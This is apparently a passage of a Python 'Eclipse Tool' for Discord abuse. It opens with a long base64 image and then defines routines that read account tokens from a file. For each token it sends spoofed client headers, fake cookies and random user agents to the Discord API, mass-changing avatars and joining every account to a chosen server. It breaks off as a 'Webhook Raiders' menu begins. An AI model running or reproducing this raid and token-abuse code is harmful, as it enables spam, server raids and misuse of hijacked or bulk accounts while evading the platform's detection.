98zW7g+UGmjfgteSlibqkGPTPE7jn79z/+B0maJc2LivPSVm/EkB4Tq5IUdVHDyYqMSMs5vupYKIVaAVz1nb/mfVBICV7xZbVJEmbMqPkVSOgWsqyomRcvlM2LfQGDtT14QUKPj81uEfnB5/6+R47gGeBTiHuBmryxZ86mkAboKB+HYcvpXiGdRKzWu1C2VkhgEfyX8vDh+ndMvCPu2BEPNGKXmeqq0jrif8/uOnf7RZHd67HZBkBK3NuBUgGtyYMriRyj1WEXIrsYZpAgdpm666LHd+JQO2orCbAqoO4k7AWbpLqysmlxLkZKQloAVnRCeFoN7sYH59tZj95sMfzc2QJK95HpaMXkuO8EdSC5xCH7hvgO7cnb1muS9Xdzvggfx9TxEA8MRTKKJcRSp3FSSH8X/75KO4OJjP5h4UgjUl8M2FMo7kxjW6olQCGMFU8ncX/B2djxVegQFFDlSUT23gqjkV5VYh1kbDEp1TNARDkCQqNDaHFp6uHd76YDN+6/S0g5C0q0NCFaxj95yH8VINfzNLdeVr5os/lgb3tvYW5EQSJLluOP7u0dF3Yjq4dauHEBCDnG6QCdGxkSLptERLEIiwA02rYUZR/y+ZGXqGAVPAQkPJiQvwMIEjKZkguYtikDViB7QVyg+qIXvaXgg3OlsczP7g6RM4UYuGrM0EgWwJhz9W2r2PiXD1jvjsr55dz+fE9jVwIm9qg1TpRJty19LvPn7K/b0+sGFIVrwbR24vU84FNNUs5ybACgGmKafoWV3FF0MlLpeALTtQijAGNVAHNUQgc+6zhRqllppR+4Z9Yp+8Tl4j9kxz4u3FtdNGv/3k8R62kJqsJfOuacCl0vASu156QWnphWyYHvip3KGmZlu3V0iaw37n6aMjM1vsQwmAk1kZtLSccWlh2XnPDdy1aDRhdadAgLaDmr1qvQCYVeRLVZ/mxIvUQ13BH7IHDoSZAGgPOBQPYHPawnXj+t53Npsna1zXblcDp7QSiRP3F+yCN9oWSmANrOUzhlD99wle1Tu/t1r96Th+cf9aOD1pFVrTYEiuRCUgSVEe4QnyEpEJpG/7+7egkXNe0RXrWQYIlru9FDi5/+UnQC3UuuZmGXXbQV35JwKwB1uYDoGDYPNWs/297z19gloVqfnhElg0ZJJOtN2Gl0x3eEXSb/vlzhN9NydD8FRaWDaeMjJj/0vPhsfvL1dfn896Wks0so0SlCuW5kCCIuGZ8GTDbGZyL6a0LR681ICDZzZfdY9NCGQjNmID5iaLltnfr+BnqBNmZIAaakHdoG4DNw239nX3bpv222+fLoG0S8dqgRnAjTRe8v9X0tcOtFdigkteUG6qfWYXn/lYcqnhVOSpFQOhAb9/erbpuq5pW/PO1FE5R9JIoWQHFMpPUf0137qbbNo+0XPWMxKQ4VZ5RIaK/jEwUA3Ugh3ZI0N9lEEPe7BOaKW5cUGfhaZvG+tTf2/+9DD89snZHmsf+7awU37O5JeoSGmy+bnjd+qRe74+ncSntLuWLhflGstu7DYAg7ylbSdVlPq6eoYPlquRYd72s3ENM6PO4CJmxiAASrWLPxFRshwbcAq+LlD0eWwoDNhNQmSxr7VoiBKZe/gN1gqdoYMaaUbbox1ILZGkVmxzI4Q5Gdtrs+POcTxwFkrKnDV/Bhog6GwCJew4uAFYgF1FRw1AFFJlw6U8mB4vzzVowVYMhDKoRBIvZoZXUp/DyRr0SEJiCPjBsFqldK1vujPkYNSN0V0ioQR2pCujUUTIrPij2Te1abzKDu2vsgSXGOFnnrAmT0rVgaaCd5sJHRFoHehEgAciyG3Wdgdhvr/3aLnBCPZT2zN3g7sorVSgHxMdCTVAD8yAhhRtJV9LG2AU0tU8oErY1ZMLsgVdHokoxuzQnH+kpXTjfE2/XAWE0pD8ZjcfhdOSjoQLp8RYsvRmcqoAZPPXUk0mOLfI3Rcqz0sYUFxFnQ8mJmXMHIrDjBSSfEMER0O1RGe2mAVrfBx8cDxejrkfdyd7tq3friHnOSuUpW7K6swszEK4Lp2mdOzpTNpot/a9wzahBebkAXlgYRZCcq1STPJLYAeZAZBDYeoBrNiTbDuXcQyGAO8YRnoH7TFs4KtilipwqACJ6FnpZUW0WxqemmquYMVlDCBynaEpX5/mUlgOgbU11RlVTOVKANkalZBGbxisC8uUka9NKb7U28oKelNmPVxc2YvIVcbOQmlUl7tKFedZITCgA/aBfdqiaToLGyRz8gpHhMAIjModJTvqoYxUYYTP27AgDTYSydA4OueMloBBiEa4zOCAXFtk3k4KmoSJpR/2Ch30HBd8C4yqDdcXBoUJQGOhg7W0JlfPkkeHzazdV3/dPKQKHt4++VQVXOtiojBHpRn0mpvlRvfBPferlEEfV2yl3JnsQHSNnpJcUMp42yuecFAZTXGxaigndNB218zm8iYbcXgDzHJ/smXHLwtBzkxfhojQjgW4YjWVmLtucgUPbAWoWJULvgSRB4wUcw0Xg4XAfh72D9kfqIDtp+JJ/aIBDqwvm4UIIAFroAOCuysCiEoRStnXvuxhVCw2Rk8EBqdLG2kNDdBVuMEBvp/7GS5cCwoNQvBG6MkZeSI52RldGuUdCC8DX8ZcGBdiHdAAoCq20sbNqyduXfSCJqwZ6uiX7YAjQUYXEpCLEgmKUCQN3CevEfNGbZvS4KcnOlhHk0qKvvoDLAAvJmm8yqUhB+kUcKmXCCVgANcqtvTZbwkYgDWyECaCEVoBSyhe8RUCm53ducUxEIjsuqaZKfTeRi6EPdpID0lOJGFEnV1Rr+awQCdUZzTs7lSqbptnuXDRBrCO2kCRizp1BwhAkoaKxELJkNAhkwWC7gLIBh42x9KGe10ofvl5G0AiSekyYF4Wl0SupKgy2cOFERpxiQUuXyFGYSlFIJBCQZHEq2GzBIbaaXQuc0lg8IPrtpjF2XXGmPoB+0ICh9wwBnPICMpFOZjI0rAFZd/XQRFp28GSh09cYosvd0Mr2LH4BCqWGUkYqVHcEKJmOeVkFOSiy8aIYQmG1F03j/Hmoq/pLOx4BCAwXp1jKDwAHBimkaKQT5NqLltODMII5PY51Zjjqq8QGCHPgxV27kUixMObobNNONBsbMd1nI/uxCnLsKc4qQdYVn0buFENKEcDJCoJaWsCrixMXmRAJrSV5t8cRpb/bLLmDkSJwCAMhh6KUmO2B45E6KxtjBwQdWvWTeZjlxz54S9SZKejkzVo9nNDWK+kPuvN11mW29Gkz1kOTr1F+YFr2qO5827fnj6xxvoZNq33FEXANkCCi9Y5Qja+coFJE0s07npEk5W74laaCwl3L5WXMrQlo7FdSFAgp0yTC5EciCXUg4lcko0rJWlI7dw82urT48PbB7jWRampAIHpv4rP3NIFhrxGWYZXvK5v8YL/KuaBTZN+JgyDHHf6O4ehj2vrNYzedV3bjD76DAYqAsEVYYKie6vcNsBcNXMgeWm7fJl7vuiGUpX0gMOz/sm5NM8TQ5xJcCEJG3AlO5UdiQ8THoBrcB2xHKXULR+u9s/sz93aW5cJoZioLOWQUrt+1l4BOV0g2pupj0WgAWbPsLmapm2lYjPiL767f0gblqu+7wANQwzBzHLnM2eyBbFP7Al7wNyyp4QZ2Gc0o5VO6epPPo8Tl9eEt6+m6LCGFmVaZ24UBh0coQ08992JiPDVMi6P0+knGzwdfv7afoFp1C2RORqxaxeQgD3iF5r2IANvdu/nx+NBjireMfu5cInBi3WKboXKAaN+5f7+fLlZHy0VYztnf2Awp0Jn3KMW8iAlpZbYtzCDdWIe97Ezh1a8zMV+9lme26i9VUaYXNtERCg35lWlKYGwMgUJpDvGE5rHw7T8xft7+FZCV1KFWYMlFe9wWgH4SJpLv9j1j1L84xTHCkW5YB5euKaHzPJ0k3yvaTvaH8dh+YzfNTXjZLttFGB/5v6+HT8dxia0ROs2w+warPE4CEIYjE7JHRpcXgfATkZOu3Pcnrm3Cw/yLANKuqsWdEp5I/ci50SHlWlY2SOQAyOwdm/I4OrIgxZNn+ygs3b1C3evYx5SgtFFSMrTsG7CPileXZGDFviup0F6r+1uN+0ncfxhiqelePBiHkx1GK+K5R75diV3hj0AABdESURBVGgPm+bM/ffHzXL7tMq3PQPnYMzIKgCmjXh4e++rB+3pw6dx1cTouVGkWaCdAykMS09PRpNRSMIAjLXancQIROTcn3nN4VTlVke6nV8vMS3lvOWyMo8p56CQMSmRk5uUm7LVtdbQTx4+vH//rX/p5279xh8+vgElFuMRiT3aF8CP5bs9zh3wgfxoWP98073T9neb7ijFxx4fua92wulnrfekRhrgBnnTwmFo9i0I+nAc/shTc/5RE7BP3mHjwghPggwk12P6l79y/f7Ak4+exnU7nKXNKdbHUiyebVxjjFxCZ9SpdAZGsYK06jxfINVa8QsLSi9gwDQSuBrPbeVByFMGYEKTAbZiK+VCq1Jq2gDa3njyT/3c4W/83hMuGsidnmNgA2a0d2kPlU401WbRAafA74ybr6R4r2lvNO01NG+51kor95W0yW3TLkeG17Et2FDOzOYWZmRLE/Qoju+n8SnQTY+jkpa4S7vGkDGNRQsZ1RDin795M/7gZPWwHVaMG/MBHFMauFxrcM9d2mfEQBvhA7ESlsAa9IKXrg4Ligf/fN15JQNy7t9L6Zk5eZAIp2Rw0XZSx7mRwUpPm8ldcFdgQlo++se/9rUvfql/8MmyNUg5lM/GxXvaWxauuT+UrysoKACB/FP5D4f1WxauW5hb6C30Fm5ss1K7Nc6tbSMwSE/j8MDjQyiAfR16nP2r6+BNCy05SBspSkkZ4IYT4Vfv3vi6NZ/+0SfHRxoGX61iHkS6Sj7CVuCSvqFWjrV0QhwLa2jjGslRtiYi4Cq0ylNhd4+4eXaFZ01znfopUxn+WcAxLECSAFJ5LBZ7oQMWZj2NkrlaaNFw1oUo79uW89N7X7uTZvO//Q8+mc0a+VSnLQ4VgLnZDbMF4MCmUirf2RN5B3S0URiFHF76FI5U2Y/CKMTsHMu/6/FUavMEGkBACxyS9yxctwBgLQ3QmBkAyMiGG0//zte+8o2Ynrz/8XLE0ZhO3c7cjmGn1Kn8lDwVToUj4gl4BDsGT6kzYkmuoDV8qP3cdXbyS4BzL2VAzuBkYajD3bKbVWwAiV5swTwtj1KEgqE3691CJAK6ns11Ht7ye1+781/9P0/8zM1sauhUhdc5QHBmds3sOm0B5IxKBA7Nboc25TnEKD+Z0Pnv8gJKBaisQO6TJ1IA9sAbtDtmt63Zo5HcSEOlfs5H5R7PpfGXru//a3ffOvnwg4drP0p+6lwKZ0q5U2MQN7QVcCKdAKfEyrSEVtJGWANrYiQimKprm3I587lNMpczoDZU5WpF9oamIfOsCVxluLYMdJF5zAhy7aB19H3oD3xxM7Sz9VvfuLF3+/r/8ps/mi9M2hYIJhvltdISyBltn3bNwnXangVN5YGiW7d7Pw9HT9M/ayqlgV0jDy1cN1swBDIKQ7EfiIX0ysKEQDOuGv3bX/7S2+v1Bx//6MhxHHXm2ChtaGvXGjohnkonwpJckQOwAdbiyLzlCVgiEpRvKZHOeuDWqzNA59xYQSzTfPOMMhZwq8ny2PI8g58UjBbIGdVA3czQAo0d7J196Zvv/e6Hw3e/d7poGt81TOSUO8vNJ7HunTwTpmiJ806FzjPvwj+9PnOUBpQtH8t4DVRZKX0mDDwO/ldu3fkXb95+/MP3TyJOhniScOKY+kEG8Aw4BpbEhhgBgYM45KkdQAJyP/dO3qw0zOiyc52ex4DChXN13FJOzyMTcieg1X5+Sk1pzUVDNmIrLYBWaDt0izA/VBNWt+/P7v783f/mf/541ue85qSItkmJeihGcemKxs+IqTIwfRtA73p45XUe+lad3VTJXdUXcklnEqM8zn1sLLbh3//S1/efPn389NPo7TLpxLWENrn6mOGAzoEciSi4MAIbYSTrlScfNJ9GMJ1S8DzqX8GA2glYgavbIVgZPWMlr4bSiwvldvKQxwQRPdWZdULf0BpZ1wVrjU+/+t69+eHsb/72p3uL1j1jqGrpocRj01Bh1uTidoPv0J24KAHalYYKGixVh1RDrRwcFaCRgQGhDafD8B984+u/TH7yw+9sPIwxjcnN3ZWpj0hlPZOUTyNghAZoKKJQpDYy+whT555q+uB5HKinQz3Lg8rAUrXOsjR1nudRZeVgABb3kexoHW1Gm4NzY0OmUdLYtRqH1I7Lb/zyuw88/P3/+9HevPcJ/kZs/1RCn49iqFpZfI4E1K9Me1x+7jo7OYPS8WxHq/Rv/epX/o33bvtH30nr5GuLKTXu+7JepQk+Z5NWwEgrCNHcmAcmMIJRiKVthrkUsz05SOcqQs92rV7BgB02oHaIT0hu1q/kRFGorRYBaMQOmuUGSsGjQ952bVS01mbt+u6t7pu/eO///P74/fdPF7PGy7Cv+j/tJAInKzGBilAbuy61BKr4jUkadjmUD9HwKm0MsqY5HviXv37713/53e7xD4ezE51xs0pj8lRKiHn8GiS6OJKbIlK5Og0pz3XKRrigoX1Cs23RsOeJ+goMqNWpaURGjdgxwdZJEhZKO586ljb53FbYgIs+yFO3x/mC6LvNw0eH17s/92tv/9b3Tj76aDlflPz3+fzn9qXO//3s9t8G+lPH4sUPazIPyF5Ea6EJR66/9O6Nf+9Xvnz45MGTDz5ePbWj43g2+kbYOFbyM2Ej5WHf0RXBSG6g7OknMYEjyyynlDtVVXoFKvWxTbJesV6CAdMHch9M6QwDWDrzKWaARp5Y0+TxiYIRMwWNzqimNQdSRNuh64+++vPzf/QvvP1/fH/z4Z+ezveCtifobWsmqhWtc2nrbdFqy6ELuug8wzQNJEY+sy9Yazxy/tNv3/h3f+G9e48eP/jW+ydHzclRejriFD7CkmwDLokTYUVbQSMh2kjmcG9DRsuVwez7IxGOgk7JvtBWo+6Q9lk6v4gB5bclKLN6hkvYwdjmjrg8sSaPPTIp90aH2uJMp8jZgV9/u+1uWLd59KW3Dv6xX3v3Tz4cvv3dzXyvgB53Kb3FVm4LfJfQ/cI7tbZSy8ITRrMMNiIaHiv+c1+4++vf+NK9J48/+d4PlsuwWvk66sz11H0pbMhRWgknwIYYyRE5jCj+cVSppsXqOieUkz40nX15bqzKlS0OL8WAfIUymt5kJT/BUMGweRB9AwbRiNbK4FYjk7wPTXBf3Matd1rnQA/ro/D0+4/uWvdPfu1e2PA3v3/WNCEws2l7z+csQUUQXiUB2C2tAPVMsUr9ALa2Mlt5/Ktffe9fvfPW4gcfP/7wQ1ev6KshDY41tAZHZMdf0SyfBJRt7Lrqn0hmGxDFWIwwa+xShhw/W8J+wcSsFzKgAmt3+y9rJ3c5GYZW/FU0VAs2oOcxxmJH3ftK2x14Gjie8kffjiffDcPHD/eH+M3rb//cncPfefTkyUbzfErJVhQuqqAtuaeYQLjUJJS/jQzGQGvDMfWF6/1/9Etf++ev7a8/eP/hw0/HFIbNJkUm58Z1Km1gCRykFZVIOkdogNaGdW6tgfJwo0SO5AiO4Egm0m3q399JDb5oXTIr4qoBH9Mwr9yHlndjHTSAltaa5U7uDpiLgZbkC+NMONjn7BrYypyPPoxnP8Jwws3YLh+txh89+ebNG3/xy+/MGv5fTx8PZrNgGVZ5IYLf3fuT07n722Jya1cbAkIDNuHYbNPEf/Ptt//au1/5Mz6e/ej9uBwQ5aOvY4pJcozQShqytoHHcsoEEjDSojiCg+WSS/Z88jBRxQocmWT0XE33PG1figFXfdTqzHYr32TpXiJbos2J0oIRZwsmKRhmwILaC+pmCA2HUx59CG2a9dnI6E0Iq1OsP/z4Nvln7977tcO3PI1/sF4NbLpgtY90i9arArh78Ej5EVWax8sEG6ppTsw2Fv+Ft+7++nvv/aVZHz568OD9D1dncdykcXR3JoYxlXzymtiAOcRN4FiSENiYDeIAjEKsMddIxlzRLBWxSVivZMCl6+JHrpaA7WmDgblZMB+7gxmwgFqgNM9Ie8QC6IAb4E3optl16ODQ+j1bn6T1U46ByePBXquWqw2tVfR0c97v3X37eH//u3H8O08e/96jo482mxaciSa4plLrpJ1q5009WCFPjEuGJRzut+bzv3Dz8J+5c+MbXd8fn3z0wfsxBSa4a4hpnVI5ZcwhapO0snAirYm1lGiD+wq+Is+AFbCsh8ONQiQjMEqZAQX/W45N5O45D4V2V597eCl85nLGlR1WxnSo9IgBM7AnSASpBXrjHriQ75E3hTvgNWOXfNEggCkqmS2pBprRRmJD0mgNbvRd8g1me+3Nm0/3r31szR+fLd8/Pvr28vjhMCAmyjopUHl6s6FMVhIg+aoMVebb/ewX9q9/7eDa/f39a2n9ztnx4vhkszxZexgHbtK4cdE5ehqkUYDYBIyOU9gKWgpnUN7XS2FNO5bOoI0Ua5J8FGOGSpaUiXK2Kp9BdsHxf2Oji6dyfB5a0+RdX4/pEWVgQ/XgHrAHXJNuireMe1AeaE8yUgNEYE4SXFFrqbGmJeYNEWwgRmjTWji4EQ+uhdnemj7E+GC1/nhYPx7Hk2E4i2nlaQQM2gvhIDQHbXdz1n6xX7zbzg5aXmdIZ8ujk+Pl8bEN65tNO3ek6CnB3ddQdNHlwNoQBQgjsZEywncpLKlVaSVjZskGioBzKr7nOkS2vTXWe1MMuJQNpTGmMsCIVmqFLp+5CeSJ6TPaAtoDDqQbxA1yIbUWcl48UJB3MJe7YTAbShDvHdQ0QeQm2CagdW3M0dr+fP9wvt/MZtYGM2vMojzVw+4SKXkQOkeXoi1XZ2en8exsw7gUlNokjyk2SVHewIKXTrROcGApb2FrcEUPxOA+wNbOM+MxfKN8JCJX0hqKGfimonOSGAmH14Nvi278rBiQlyFPjVa2t5kZgYQU4DNwAZtDM2ifOMzYMbIDo9SazWUbag13+czCxt3MemIFH3MXpoUlNRoWoV3TFQggED18QVuYHXZ9S3pgwxBhJzEu0+gphuiNvIEMYeVJsORcxmikog/OtRCVFrSGMMlcMDtT6sEBWomNMbpvoLW4ph1DZzkjXSIDjGQSE+SSYBkRopq73YaQr8KAVz7IzamS0UWNUaVQjoFiAseciiA2wAoQtIFa0IFO9kS+ViKxxzAKI9kJENbShmiolXzpTmfyeMbEFAgLxrWFDXzNsYmpz2cFy06gM3KjFGCdrJF10kwpCUcpJtjac/8IkjwPKDr22AQ2JRGPNbAxyLF2WlI0roSBWENL6AzY5JP9aktTScPlQv80/ay0ul7VifO89coM2AmImM+Ro5SYu005qCQnDGiElZBISi0EoGPMU94bs2P3DWXkzLEGBnKEGjBJg9TKBtc6H9SGJEMXMMpGoQvac3SGDdIjT+tAgExxI+uEQb6CXHaWNJgPAt1bCwNSkhNMAUHqaaToTtrafQBGK52nAzmQa/c1sYYGQGAuSpfsvzKAvOLXLqJZP2MGcCdAzRBzo0KdtjoyDxBVgNZCAyaU0KEFXKRkUJTnihWplpLbkhihRpToMicSmNxc0cDknjw4MMBbl8PahCP4McCkABvciXy2gycHpCW0cS9ToOWUObwiw2QFJabebU2eoZzVBIO7NtIK2HguGjORubBTR20VkEvOxpcTlHFJy/nLwCl//NNU6Vn6KkYokkMe2SKswE2mfjlYWZMjm0tLAVhDg2kliWzqqeOgEjx72SYFJ8rBXmqIAaJjDTjZgQOxcTqU3XMAkVoDG6mFBdqpJzOW49yQEeQMZJI7tIZWNcSJ7u7akJs8nQZyKCnjMLLyUYl4VZpEXxaH/pkxQJkH2+PEgShEKNDWpVS52+/Hen4ekhRAQWu4yABLtOgpD0FN8jxX1IheGoEkb4UNSSgIkdggRYShzFEsJz4D2kC5TNgU95wuUhiIUTILydGATiZhpG2UTDIpEREcp7J+PqqkAi/K7PptQPhaXQzn1/MYcEGCrk7Yaeroc+SOkVybLnn+fI5qEAZSgDsalvPPchfVaEW3Sp5y7dDzVM5sKpWopCSgKYdQygwRXIMn7qqVMgpBAjFCZhk/mwthTC6U8DWPNRQlmdHVuAVwzCfU0zYoI4rzXLKJ+qmOyi2wqatJ/xmepvqcpRKkKApG1kyaoGyTCwwiATQrJRjSIBU4n7KRBDMeUg6JbMVejNSg1ICR2BhGWa7bLIE1AeXjtBmJlfIJzuWcBSeT2SgkuYqm5OAuwimXnOqAVsGRBkq11J6Uz7BCbo9NpVHlx9/xF9ePcZjnM8vrYdQ5Oh+3FXathVHFVjBjq0vZYlv5clYuZR44SDg0ZikBCCSU5EGCBK2BFdSYtfXEETcyj7NG+VZ0nzAKUxI7AaMocAMtkWY0yFw+ArnEWCoBU7KBpm2345tcL8uAlzy6PuWj81DSJnnlJlNq8t3cpokyFbZR0+gS6O4ZxSzXWCaG08DcNOmQMkaizvpPjlxtNGXRKG0jzPj9ChYqOaPSGkYnomvMUgsPOa7WFhw2jUWYqg7PJ87rjfV6BRX0Ah4QDlBFTlm6S0viMgPavbY61SnQaoSmJDVZ1ThS0bM52pJBSeUsBSvnjJN5pIEZMloUymcFNwSh6GiJAI55F5Ney+VeOgwVc1Urt5tL9aA5OENCnkuWq7vycqz8Z7LemA3IQIDSVQnFnTEEuUg7TejMRx8EGuGikuf5eZOJgwpeXMo7OjfMQomMeZSXTxhpV04pUxEaau5a9BnYEgIGaXTlodsVuJgBQqqTuOk2HYpkDq8xV0HnF9hGhUm9MYoBr8yAS0dJblfOVWFSKZp8T5UtXdE9gJdxnjuor53rpPpZWvYji1lNzIfdwbmbB1aqB7+YGMhUHQDl9hUi7SB8y8Xz7q5Atupaqg5CND+PqHje4XY/BlfenARUzyxXq8PWuG4jgG21nconWFMFVHqhhO1lvgI9N2+RSdtydADjzjg5r9ONIgCimXARpGWlb8WdjzSXT00TucuzoPilep5wOSHAz/W2PI/EP85QxzfJgAk9klFjdm4QT+1Azq8rwSMQpiRiLRsBFS+3nU1Ufu9lcjmSSug/Uc0LSFZ5svsASmhpGQ2qMnFZ2QaI9WjEklegi5Pj7KXtnfrxotyXWa/JgF1iXf4BXDhaCwJst0pXkodVPKZo2b3A7WrJ0SdMhkNk2oFw5agvn6GzRfIKTcl8eM79lXMfucWGbmG820nq+dzy7GXB9WLqv5Fppq8vAS9UfL5tMSg3Ws+3m8xDzuUWZtZDiVisxdY53V7FNaUDS0m+UJ8Fj5lPXHMV8cotzSr9csWoeoGSZ3cgQ6kqrKEOiFEt876gw+jHXq9vPZ5TOs6/eDY7mCHVeRKLaacPe/d2mBNFuepLg5dpzPVwhAn7tAVO50Ndsse0O6CUsmn6DgvG1lEc0LxUN7ID+UTaKkwvRZkfXwheXwJ07lG3t6srhqM9+63d4D4fe1O9JEAKJKAMM86534oL3gKkq7nd9vtNlj4b1Zx5LQEY8iHA8iqMVfkUNzm3jfuLYq7Xptil600a4Wm9dLzOKc4s5i/nIgTjts7h5RCb0iW469pOQwoF+nljXj9TBtJkM16abTJ2RJ4qoNqKRiw1GX32mmdLgjd/xef4y1vKXHU3mjYxawidZ8KXrrU8Q6h8dov/Lhv5vHhV87FNHksVugyg+q+7dfTL5vieW/9wSMAL164vtKuxrGoQr7+2IiHl3zsorHNylsosq/NQRk4KJv+Tu9Sv97G9/k9S80zrzTPghR7qhRLSuSerw7V8B5teLQS0UxC98FWv0eolF+bUK7HTuqXJw+Gr6Mw3vz7D//k1AnTubvW68pD5F17cn92kO5djrgW9RFx1qXPx2UnAT4j1L8mMZxlQjkN7mcd/btz04rNE6vrsaH3punSy8hteryAKPPf61Sjx3M9fNfL7p75+ond1KSd+wjvuZ239JCTgwnrjKfXP1+fr8/X5+ny93vr/AMeYP+TXWRyrAAAAAElFTkSuQmCC"

        payload3 = {
            'avatar':image
        }

    url = 'https://discord.com/api/v9/users/@me'

    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        if optionsforpfp == 1:
            r = requests.patch(url,headers=header,json=payload1)
            if r.status_code == 200:
                print(Fore.YELLOW + f'Done! added pfp to {token[x]}')
            else:
                print(r)
        elif optionsforpfp == 2:
            r = requests.patch(url,headers=header,json=payload2)
            if r.status_code == 200:
                print(Fore.YELLOW + f'Done! added pfp to {token[x]}')
            else:
                print(r)

        elif optionsforpfp == 3:
            r = requests.patch(url,headers=header,json=payload3)
            if r.status_code == 200:
                print(Fore.YELLOW + f'Done! added pfp to {token[x]}')
            else:
                print(r)

        else:
            print("Error")

  global joiner
  def joiner():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Token Joiner")
      print(f'''
{Fore.RED}
▓███████▓ ▒█████   ▀██ ▄█▀▓█████ ███▄    █      ▄████▀▀ ▒█████    ██ ███▄    █ ▓█████ ██▀███  
▓  ██▒ ▓▒▒██▒  ██▒  ██▄█▒ ▓█   ▀ ██ ▀█   █        ▒██  ▒██▒  ██▒▒▓██ ██ ▀█   █ ▓█   ▀▓██ ▒ ██▒
▒ ▓██░ ▒░▒██░  ██▒ ▓███▄░ ▒███  ▓██  ▀█ ██▒       ░██  ▒██░  ██▒░▒██▓██  ▀█ ██▒▒███  ▓██ ░▄█ ▒
░ ▓██▓ ░ ▒██   ██░ ▓██ █▄ ▒▓█  ▄▓██▒  ▐▌██▒    ▓██▄██▓ ▒██   ██░ ░██▓██▒  ▐▌██▒▒▓█  ▄▒██▀▀█▄  
  ▒██▒ ░ ░ ████▓▒░ ▒██▒ █▄░▒████▒██░   ▓██░     ▓███▒  ░ ████▓▒░ ░██▒██░   ▓██░░▒████░██▓ ▒██▒
  ▒ ░░   ░ ▒░▒░▒░  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒░   ▒ ▒      ▒▓▒▒░  ░ ▒░▒░▒░  ░▓ ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒▓ ░▒▓░
    ░      ░ ▒ ▒░  ░ ░▒ ▒░ ░ ░  ░ ░░   ░ ▒░     ▒ ░▒░    ░ ▒ ▒░   ▒ ░ ░░   ░ ▒░ ░ ░    ░▒ ░ ▒░
  ░ ░    ░ ░ ░ ▒   ░ ░░ ░    ░     ░   ░ ░      ░ ░ ░  ░ ░ ░ ▒    ▒    ░   ░ ░    ░     ░   ░ 
             ░ ░   ░  ░      ░           ░      ░   ░      ░ ░    ░          ░    ░     ░     


      ''')
      tokens = []
      token = []

      with open('tokens.txt','r') as f:
        for line in f:
          tokens.append(line)

        for element in tokens:
          token.append(element.strip())

      length = len(token)

      invite = input(f'''{Fore.RED}[{Fore.YELLOW}+{Fore.RED}] {Fore.YELLOW}What is the invite of the server you want to join? (Only Code): ''')
      invite.replace('https://discord.gg/','')
      invite.replace('discord.gg/','')

      url = f'https://discord.com/api/v9/invites/{invite}'

      for x in range(length):
          header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
          }

          r = requests.post(url, headers=header)
          if r.status_code == 200:
              print(f'Joined With {token[x]}!')
          else:
              print("Error")

  def webhooks():
    global options2
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Eclipse Tool | Webhook Raiders")
    options2 = input(f'''
{Fore.RED}
 █     █░▓█████  ▄▄▄▄     ██░ ██  ▒█████   ▒█████   ▀██ ▄█▀     ██▀███   ▄▄▄       ██ ▓█████▄ ▓█████ ██▀███  
